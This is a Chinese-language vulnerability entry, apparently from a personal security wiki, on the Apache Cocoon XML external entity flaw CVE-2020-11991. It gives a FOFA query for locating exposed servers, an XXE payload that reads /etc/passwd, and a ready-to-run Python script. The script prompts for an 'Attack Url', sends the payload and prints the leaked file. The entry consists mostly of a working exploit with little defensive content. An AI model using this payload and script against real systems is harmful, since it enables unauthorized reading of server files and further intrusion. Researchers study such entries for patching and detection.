# Apache Cocoon XML注入 CVE-2020-11991

## 漏洞描述

9月11日 Apache 软件基金会发布安全公告，修复了 Apache Cocoon xml外部实体注入漏洞（CVE-2020-11991）。

Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。

## 漏洞影响

```
Apache Cocoon <= 2.1.12
```

## 网络测绘

```
app="Apache-Cocoon"
```

## 漏洞复现

向 **/v2/api/product/manger/getInfo**  POST如下内容

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userInfo>
<firstName>John</firstName> 
<lastName>&ent;</lastName>
</userInfo>
```

## 漏洞POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import requests
import base64
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: Apache Cocoon <= 2.1.12                                  \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-11991                                    \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/v2/api/product/manger/getInfo"
    data = """
        <!--?xml version="1.0" ?-->
        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
        <userInfo>
        <firstName>John</firstName> 
        <lastName>&ent;</lastName>
        </userInfo>
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-type": "text/xml"
    }

    response = requests.request("POST", url=vuln_url, data=data, headers=headers, timeout=20)
    if "/bin/bash" in response.text:
        print("\033[32m[o] 含有CVE-2020-11991漏洞，响应为{}\033[0m".format(response.text))
    else:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```